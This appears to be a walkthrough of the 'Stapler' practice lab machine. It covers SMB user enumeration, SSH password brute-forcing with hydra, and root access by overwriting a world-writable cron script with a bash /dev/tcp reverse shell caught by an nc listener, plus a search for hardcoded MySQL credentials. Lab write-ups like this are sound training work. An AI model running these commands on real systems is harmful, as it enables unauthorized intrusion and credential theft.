# Stapler - Walkthrough

## 🧗 Initial Foothold

### 🔍 1. Enumerate SMB Shares
- Used `enum4linux` to enumerate users and shares.
- Extracted a list of usernames.

### 🔐 2. Bruteforce SSH with `hydra`
- Used the usernames from `enum4linux`:
  ```bash
  hydra -L users.txt -p SHayslett ssh://<target-ip>
  ```
- Successfully found valid credentials:
  - **User:** `SHayslett`
  - **Password:** `SHayslett`

### ✅ 3. SSH Access
```bash
ssh SHayslett@<target-ip>
```
- Got an initial user shell.

---

## ⚙️ Privilege Escalation

### 🔍 1. Run `linpeas.sh`
- Discovered a suspicious, world-writable root-owned cron script:
  ```
  /usr/local/sbin/cron-logrotate.sh
  ```

### ✏️ 2. Overwrite `cron-logrotate.sh`
We had write access. Overwrote it with a reverse shell payload:

```bash
#!/bin/bash
/bin/bash -i >& /dev/tcp/192.168.45.179/80 0>&1
```

### 📡 3. Set up Listener
On attacker machine:
```bash
nc -lvnp 80
```

### 🧨 4. Got Root Shell
- Once the cron job executed, got a **root shell** back via reverse connection.

---

## 📦 Extra: MySQL Credentials

### 🔍 1. Search for Hardcoded Credentials
```bash
grep -RinI --color=always -e 'Simon' .
```

- Found a file referencing the user **Simon** and MySQL credentials.
- Credentials worked for MySQL root login.

### 🔑 2. MySQL Access
```bash
mysql -u root -p
```

- Found multiple password hashes.
- Cracked a few of them, but **none led to further access or privilege escalation**.

---

## 🧠 Notes

- This box can be **confusing and noisy** — lots of rabbit holes.
- Root privilege escalation via **cron + writable script** was the key.
- MySQL, cracked hashes, and user sprawl were **mostly distractions**.
